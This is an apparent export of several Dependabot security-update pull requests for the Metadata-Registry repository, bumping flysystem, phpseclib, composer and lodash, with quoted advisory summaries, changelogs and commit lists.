- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,930057672,"[Security] Bump league/flysystem from 1.1.3 to 1.1.4","Bumps [league/flysystem](https://github.com/thephpleague/flysystem) from 1.1.3 to 1.1.4. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/league/flysystem/2021-06-24.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>TOCTOU Race Condition enabling remote code execution</strong></p>
<p>Affected versions: <!-- raw HTML omitted -->=2.0.0, &lt;2.1.1</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/thephpleague/flysystem/commit/f3ad69181b8afed2c9edf7be5a2918144ff4ea32""><code>f3ad691</code></a> Reject paths with funky whitespace.</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/1ac14e91c9129463117fe11fb6747fc25a988c1d""><code>1ac14e9</code></a> Added SharePoint community adapter</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/4347fe7f4dde0954ed3df833fd568806b714e9a0""><code>4347fe7</code></a> Remove ext-fileinfo from suggests, it's already in requires</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/1bf07fc4389ea8199d0029173e94b68731c5a332""><code>1bf07fc</code></a> Fix time-related tests failing in 2021</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/13352d2303b67ecfc1306ef1fdb507df1a0fc79f""><code>13352d2</code></a> Remove <a href=""https://github.com/deprecated""><code>@​deprecated</code></a> MountManager</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/2062a9460fc9bb9d05ce0b215176be378f29e372""><code>2062a94</code></a> Adding AsyncAWS under community support</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/53f16fd031d76208677cac8751b175d765587d2f""><code>53f16fd</code></a> More precise signatures</li>
<li><a href=""https://github.com/thephpleague/flysystem/commit/2323c98d7d486b8ce13b2b18ed6489aaffad8375""><code>2323c98</code></a> Add missing emptyDir annotation</li>
<li>See full diff in <a href=""https://github.com/thephpleague/flysystem/compare/1.1.3...1.1.4"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=league/flysystem&package-manager=composer&previous-version=1.1.3&new-version=1.1.4)](https://dependabot.com/compatibility-score/?dependency-name=league/flysystem&package-manager=composer&previous-version=1.1.3&new-version=1.1.4)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,920272257,"[Security] Bump phpseclib/phpseclib from 3.0.4 to 3.0.9","Bumps [phpseclib/phpseclib](https://github.com/phpseclib/phpseclib) from 3.0.4 to 3.0.9. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/phpseclib/phpseclib/CVE-2021-30130.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Improper Certificate Validation in phpseclib</strong></p>
<p>Affected versions: <!-- raw HTML omitted -->=3.0.0, &lt;3.0.7</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-vf4w-fg7r-5v94"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Improper Certificate Validation in phpseclib</strong>
phpseclib before 2.0.31 and 3.x before 3.0.7 mishandles RSA PKCS#1 v1.5 signature verification.</p>
<p>Affected versions: &gt;= 3.0.0, &lt; 3.0.7</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/phpseclib/phpseclib/releases"">phpseclib/phpseclib's releases</a>.</em></p>
<blockquote>
<h2>3.0.9</h2>
<ul>
<li>SSH2: add getAuthMethodsToContinue() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1648"">#1648</a>)</li>
<li>SSH2: timeout would occasionally infinitely loop</li>
<li>SSH2: fix PHP7.4 errors about accessing bool as string (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1656"">#1656</a>)</li>
<li>SSH2: fix issue with key re-exchange (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1644"">#1644</a>)</li>
<li>SFTP: reopen channel on channel closure (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1654"">#1654</a>)</li>
<li>X509: extra characters before cert weren't being removed (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1659"">#1659</a>)</li>
<li>X509: signing with pw protected PSS keys yielded errors (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1657"">#1657</a>)</li>
<li>ASN1: fix timezone issue when non-utc time is given (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1562"">#1562</a>)</li>
<li>ASN1: change how default values are processed for ints and enums (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1665"">#1665</a>)</li>
<li>RSA: OAEP decryption didn't check labels correctly (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1669"">#1669</a>)</li>
</ul>
<h2>3.0.8</h2>
<ul>
<li>AsymetrticKey: add getComment() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1638"">#1638</a>)</li>
<li>SymmetricKey: cipher_name_openssl_ecb shouldn't be static because of AES (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1636"">#1636</a>)</li>
<li>X509: don't filter basicConstraints on unique values (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1639"">#1639</a>)</li>
<li>X509: make it so extensions can be set as critical (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1640"">#1640</a>)</li>
</ul>
<h2>3.0.7</h2>
<ul>
<li>X509: always parse the first cert of a bundle (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1568"">#1568</a>)</li>
<li>SSH2: behave like putty with broken publickey auth (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1572"">#1572</a>)</li>
<li>SSH2: don't close channel on unexpected response to channel request (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1631"">#1631</a>)</li>
<li>RSA: cleanup RSA PKCS#1 v1.5 signature verification (CVE-2021-30130)</li>
<li>Crypt: use a custom error handler for mcrypt to avoid deprecation errors</li>
</ul>
<h2>3.0.6</h2>
<ul>
<li>SFTP/Stream: make it so you can write past the end of a file (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1618"">#1618</a>)</li>
<li>SFTP/Stream: fix undefined index notice in stream touch() (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1615"">#1615</a>)</li>
<li>SFTP/Stream: mkdir didn't work (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1617"">#1617</a>)</li>
<li>BigInteger: fix issue with toBits on 32-bit PHP 8 installs</li>
<li>SFTP: digit only filenames were converted to integers by php (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1623"">#1623</a>)</li>
</ul>
<h2>3.0.5</h2>
<ul>
<li>X509: add getCurrentCert method (since $currentCert is now private) (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1602"">#1602</a>)</li>
<li>PublicKeyLoader: add loadPrivateKey() and loadPublicKey() methods (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1603"">#1603</a>)</li>
<li>Rijndael: calling setIV() after setBlockLength() can result in err (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1599"">#1599</a>)</li>
<li>RSA: use OpenSSL for generating private keys (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
<li>BigInteger: big speedups for when OpenSSL is used (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/phpseclib/phpseclib/blob/master/CHANGELOG.md"">phpseclib/phpseclib's changelog</a>.</em></p>
<blockquote>
<h2>3.0.9 - 2021-06-13</h2>
<ul>
<li>SSH2: add getAuthMethodsToContinue() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1648"">#1648</a>)</li>
<li>SSH2: timeout would occasionally infinitely loop</li>
<li>SSH2: fix PHP7.4 errors about accessing bool as string (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1656"">#1656</a>)</li>
<li>SSH2: fix issue with key re-exchange (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1644"">#1644</a>)</li>
<li>SFTP: reopen channel on channel closure (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1654"">#1654</a>)</li>
<li>X509: extra characters before cert weren't being removed (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1659"">#1659</a>)</li>
<li>X509: signing with pw protected PSS keys yielded errors (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1657"">#1657</a>)</li>
<li>ASN1: fix timezone issue when non-utc time is given (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1562"">#1562</a>)</li>
<li>ASN1: change how default values are processed for ints and enums (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1665"">#1665</a>)</li>
<li>RSA: OAEP decryption didn't check labels correctly (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1669"">#1669</a>)</li>
</ul>
<h2>3.0.8 - 2021-04-20</h2>
<ul>
<li>AsymetrticKey: add getComment() method (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1638"">#1638</a>)</li>
<li>SymmetricKey: cipher_name_openssl_ecb shouldn't be static because of AES (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1636"">#1636</a>)</li>
<li>X509: don't filter basicConstraints on unique values (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1639"">#1639</a>)</li>
<li>X509: make it so extensions can be set as critical (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1640"">#1640</a>)</li>
</ul>
<h2>3.0.7 - 2021-04-06</h2>
<ul>
<li>X509: always parse the first cert of a bundle (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1568"">#1568</a>)</li>
<li>SSH2: behave like putty with broken publickey auth (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1572"">#1572</a>)</li>
<li>SSH2: don't close channel on unexpected response to channel request (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1631"">#1631</a>)</li>
<li>RSA: cleanup RSA PKCS#1 v1.5 signature verification (CVE-2021-30130)</li>
<li>Crypt: use a custom error handler for mcrypt to avoid deprecation errors</li>
</ul>
<h2>3.0.6 - 2021-03-13</h2>
<ul>
<li>SFTP/Stream: make it so you can write past the end of a file (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1618"">#1618</a>)</li>
<li>SFTP/Stream: fix undefined index notice in stream touch() (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1615"">#1615</a>)</li>
<li>SFTP/Stream: mkdir didn't work (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1617"">#1617</a>)</li>
<li>BigInteger: fix issue with toBits on 32-bit PHP 8 installs</li>
<li>SFTP: digit only filenames were converted to integers by php (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1623"">#1623</a>)</li>
</ul>
<h2>3.0.5 - 2021-02-12</h2>
<ul>
<li>X509: add getCurrentCert method (since $currentCert is now private) (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1602"">#1602</a>)</li>
<li>PublicKeyLoader: add loadPrivateKey() and loadPublicKey() methods (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1603"">#1603</a>)</li>
<li>Rijndael: calling setIV() after setBlockLength() can result in err (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1599"">#1599</a>)</li>
<li>RSA: use OpenSSL for generating private keys (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
<li>BigInteger: big speedups for when OpenSSL is used (<a href=""https://github-redirect.dependabot.com/phpseclib/phpseclib/issues/1596"">#1596</a>)</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/a127a5133804ff2f47ae629dd529b129da616ad7""><code>a127a51</code></a> Merge branch '2.0' into 3.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/3ee60b82b98adba65da8e77959e3240fa7016445""><code>3ee60b8</code></a> CHANGELOG: add missing entry</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/fbf5503b21e012a513938d278a2a4a056925d2dd""><code>fbf5503</code></a> Merge branch '2.0' into 3.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/cbadee3b2ce6eb373dcfe3cca8632848fd78d539""><code>cbadee3</code></a> CHANGELOG: add 2.0.32 release</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/07423805acdcd575ddefad919749926e79a51780""><code>0742380</code></a> Merge branch '2.0' into 3.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/f5c4c19880d45d0be3e7d24ae8ac434844a898cd""><code>f5c4c19</code></a> Tests/RSA: update unit test for 2.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/451ddf453cbd107fe4e554eb76462a2921499914""><code>451ddf4</code></a> Merge branch '1.0' into 2.0</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/c3560c2d4d9eba9202714656b2ef303602583467""><code>c3560c2</code></a> RSA: OAEP decryption didn't check labels correctly</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/d1666cac503312e859076a872dd8e716ece273c7""><code>d1666ca</code></a> SFTP: CS adjustments</li>
<li><a href=""https://github.com/phpseclib/phpseclib/commit/6d4f436da17a2225abed7654d1a4272e022057e8""><code>6d4f436</code></a> X509: add unit tests</li>
<li>Additional commits viewable in <a href=""https://github.com/phpseclib/phpseclib/compare/3.0.4...3.0.9"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=phpseclib/phpseclib&package-manager=composer&previous-version=3.0.4&new-version=3.0.9)](https://dependabot.com/compatibility-score/?dependency-name=phpseclib/phpseclib&package-manager=composer&previous-version=3.0.4&new-version=3.0.9)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

**Note:** This repo was added to Dependabot recently, so you'll receive a maximum of 5 PRs for your first few update runs. Once an update run creates fewer than 5 PRs we'll remove that limit.

You can always request more updates by clicking `Bump now` in your [Dependabot dashboard](https://app.dependabot.com).

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,869911335,"[Security] Bump composer/composer from 1.10.20 to 1.10.22","Bumps [composer/composer](https://github.com/composer/composer) from 1.10.20 to 1.10.22. **This update includes a security fix.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/FriendsOfPHP/security-advisories/blob/master/composer/composer/CVE-2021-29472.yaml"">The PHP Security Advisories Database</a>.</em></p>
<blockquote>
<p><strong>Missing argument delimiter can lead to command execution via VCS repository URLs or source download URLs on systems with Mercurial</strong></p>
<p>Affected versions: &gt;=2.0.0-alpha1, &lt;2.0.13; &lt;1.10.22</p>
</blockquote>
</details>
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/composer/composer/releases"">composer/composer's releases</a>.</em></p>
<blockquote>
<h2>1.10.22</h2>
<ul>
<li>Security: Fixed command injection vulnerability in HgDriver/HgDownloader and hardened other VCS drivers and downloaders (GHSA-h5h8-pc6h-jvvx / CVE-2021-29472)</li>
</ul>
<h2>1.10.21</h2>
<ul>
<li>Fixed support for new GitHub OAuth token format</li>
<li>Fixed processes silently ignoring the CWD when it does not exist</li>
</ul>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/composer/composer/blob/master/CHANGELOG.md"">composer/composer's changelog</a>.</em></p>
<blockquote>
<h3>[1.10.22] 2021-04-27</h3>
<ul>
<li>Security: Fixed command injection vulnerability in HgDriver/HgDownloader and hardened other VCS drivers and downloaders (GHSA-h5h8-pc6h-jvvx / CVE-2021-29472)</li>
</ul>
<h3>[1.10.21] 2021-04-01</h3>
<ul>
<li>Fixed support for new GitHub OAuth token format</li>
<li>Fixed processes silently ignoring the CWD when it does not exist</li>
</ul>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/composer/composer/commit/28c9dfbe2351635961f670773e8d7b17bc5eda25""><code>28c9dfb</code></a> Release 1.10.22</li>
<li><a href=""https://github.com/composer/composer/commit/cd682f90a6f1834584d9813d57b24435f8640884""><code>cd682f9</code></a> Update xdebug-handler to latest</li>
<li><a href=""https://github.com/composer/composer/commit/1cdbacbe07eac7d360c6bf27931da715b008b84e""><code>1cdbacb</code></a> Update changelog</li>
<li><a href=""https://github.com/composer/composer/commit/083b73515d1d72bc61c6374440b3f8a37531f8cf""><code>083b735</code></a> Merge pull request from GHSA-h5h8-pc6h-jvvx</li>
<li><a href=""https://github.com/composer/composer/commit/4dc293b289fd12a28a3f13780339a0393f094d7c""><code>4dc293b</code></a> Update changelog</li>
<li><a href=""https://github.com/composer/composer/commit/96acad1e45555380a8ca90767b3bc00a2f44bf4f""><code>96acad1</code></a> Update github token pattern to match their latest updates</li>
<li><a href=""https://github.com/composer/composer/commit/54889ca1092e387418f917bcf520ef23d415e8a0""><code>54889ca</code></a> Document GH token usage and also make sure we redact them in Process debug ou...</li>
<li><a href=""https://github.com/composer/composer/commit/dc83ba93f3d8a35629f9a387632e8cd373a144d0""><code>dc83ba9</code></a> Update GitHub token pattern</li>
<li><a href=""https://github.com/composer/composer/commit/06003f4da686acbf2df237cd77985516339242b6""><code>06003f4</code></a> Update release step to use php8 as it produces slightly different output wrt ...</li>
<li><a href=""https://github.com/composer/composer/commit/812207c823ca0c01c7ccf11f6e003d6918daecb8""><code>812207c</code></a> Merge pull request <a href=""https://github-redirect.dependabot.com/composer/composer/issues/9695"">#9695</a> from Seldaek/avoid-invalid-dir</li>
<li>Additional commits viewable in <a href=""https://github.com/composer/composer/compare/1.10.20...1.10.22"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=composer/composer&package-manager=composer&previous-version=1.10.20&new-version=1.10.22)](https://dependabot.com/compatibility-score/?dependency-name=composer/composer&package-manager=composer&previous-version=1.10.20&new-version=1.10.22)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>",,yes,"dependencies,security,php,"
jonphipps/Metadata-Registry,817317901,"[Security] Bump lodash from 4.17.4 to 4.17.21","Bumps [lodash](https://github.com/lodash/lodash) from 4.17.4 to 4.17.21. **This update includes security fixes.**
<details>
<summary>Vulnerabilities fixed</summary>
<p><em>Sourced from <a href=""https://github.com/nodejs/security-wg/blob/master/vuln/npm/368.json"">The Node Security Working Group</a>.</em></p>
<blockquote>
<p><strong>lodash prototype pollution</strong>
lodash node module before 4.17.5 suffers from a prototype pollution vulnerability via 'defaultsDeep', 'merge', and 'mergeWith' functions, which allows a malicious user to modify the prototype of 'Object' via <strong>proto</strong>, causing the addition or modification of an existing property that will exist on all objects.</p>
<p>Affected versions: &lt;4.17.5</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Critical severity vulnerability that affects lodash, lodash-es, lodash-amd, lodash.template, lodash.merge, lodash.mergewith, and lodash.defaultsdeep</strong>
Affected versions of lodash are vulnerable to Prototype Pollution.
The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.</p>
<p>Affected versions: &lt; 4.17.12</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-p6mc-m468-83gw"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution in lodash</strong>
Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.</p>
<p>This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.</p>
<p>Affected versions: &lt; 4.17.19</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/advisories/GHSA-p6mc-m468-83gw"">The GitHub Security Advisory Database</a>.</em></p>
<blockquote>
<p><strong>Prototype Pollution in lodash</strong>
Versions of lodash prior to 4.17.19 are vulnerable to Prototype Pollution. The function zipObjectDeep allows a malicious user to modify the prototype of Object if the property identifiers are user-supplied. Being affected by this issue requires zipping objects based on user-provided property arrays.</p>
<p>This vulnerability causes the addition or modification of an existing property that will exist on all objects and may lead to Denial of Service or Code Execution under specific circumstances.</p>
<p>Affected versions: &lt; 4.17.19</p>
</blockquote>
<p><em>Sourced from <a href=""https://github.com/nodejs/security-wg/blob/master/vuln/npm/493.json"">The Node Security Working Group</a>.</em></p>
<blockquote>
<p><strong>Denial of Service</strong>
Prototype pollution attack (lodash / constructor.prototype)</p>
<p>Affected versions: &lt;4.17.11</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>High severity vulnerability that affects lodash, lodash-es, lodash-amd, lodash.template, lodash.merge, lodash.mergewith, and lodash.defaultsdeep</strong>
Affected versions of lodash are vulnerable to Prototype Pollution.
The function defaultsDeep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.</p>
<p>Affected versions: &lt; 4.17.13</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Moderate severity vulnerability that affects lodash</strong>
lodash prior to 4.7.11 is affected by: CWE-400: Uncontrolled Resource Consumption. The impact is: Denial of service. The component is: Date handler. The attack vector is: Attacker provides very long strings, which the library attempts to match using a regular expression. The fixed version is: 4.7.11.</p>
<p>Affected versions: &lt; 4.17.11</p>
</blockquote>
<p><em>Sourced from The GitHub Security Advisory Database.</em></p>
<blockquote>
<p><strong>Low severity vulnerability that affects lodash</strong>
A prototype pollution vulnerability was found in lodash &lt;4.17.11 where the functions merge, mergeWith, and defaultsDeep can be tricked into adding or modifying properties of Object.prototype.</p>
<p>Affected versions: &lt; 4.17.11</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href=""https://github.com/lodash/lodash/commit/f299b52f39486275a9e6483b60a410e06520c538""><code>f299b52</code></a> Bump to v4.17.21</li>
<li><a href=""https://github.com/lodash/lodash/commit/c4847ebe7d14540bb28a8b932a9ce1b9ecbfee1a""><code>c4847eb</code></a> Improve performance of <code>toNumber</code>, <code>trim</code> and <code>trimEnd</code> on large input strings</li>
<li><a href=""https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c""><code>3469357</code></a> Prevent command injection through <code>_.template</code>'s <code>variable</code> option</li>
<li><a href=""https://github.com/lodash/lodash/commit/ded9bc66583ed0b4e3b7dc906206d40757b4a90a""><code>ded9bc6</code></a> Bump to v4.17.20.</li>
<li><a href=""https://github.com/lodash/lodash/commit/63150ef7645ac07961b63a86490f419f356429aa""><code>63150ef</code></a> Documentation fixes.</li>
<li><a href=""https://github.com/lodash/lodash/commit/00f0f62a979d2f5fa0287c06eae70cf9a62d8794""><code>00f0f62</code></a> test.js: Remove trailing comma.</li>
<li><a href=""https://github.com/lodash/lodash/commit/846e434c7a5b5692c55ebf5715ed677b70a32389""><code>846e434</code></a> Temporarily use a custom fork of <code>lodash-cli</code>.</li>
<li><a href=""https://github.com/lodash/lodash/commit/5d046f39cbd27f573914768e3b36eeefcc4f1229""><code>5d046f3</code></a> Re-enable Travis tests on <code>4.17</code> branch.</li>
<li><a href=""https://github.com/lodash/lodash/commit/aa816b36d402a1ad9385142ce7188f17dae514fd""><code>aa816b3</code></a> Remove <code>/npm-package</code>.</li>
<li><a href=""https://github.com/lodash/lodash/commit/d7fbc52ee0466a6d248f047b5d5c3e6d1e099056""><code>d7fbc52</code></a> Bump to v4.17.19</li>
<li>Additional commits viewable in <a href=""https://github.com/lodash/lodash/compare/4.17.4...4.17.21"">compare view</a></li>
</ul>
</details>
<details>
<summary>Maintainer changes</summary>
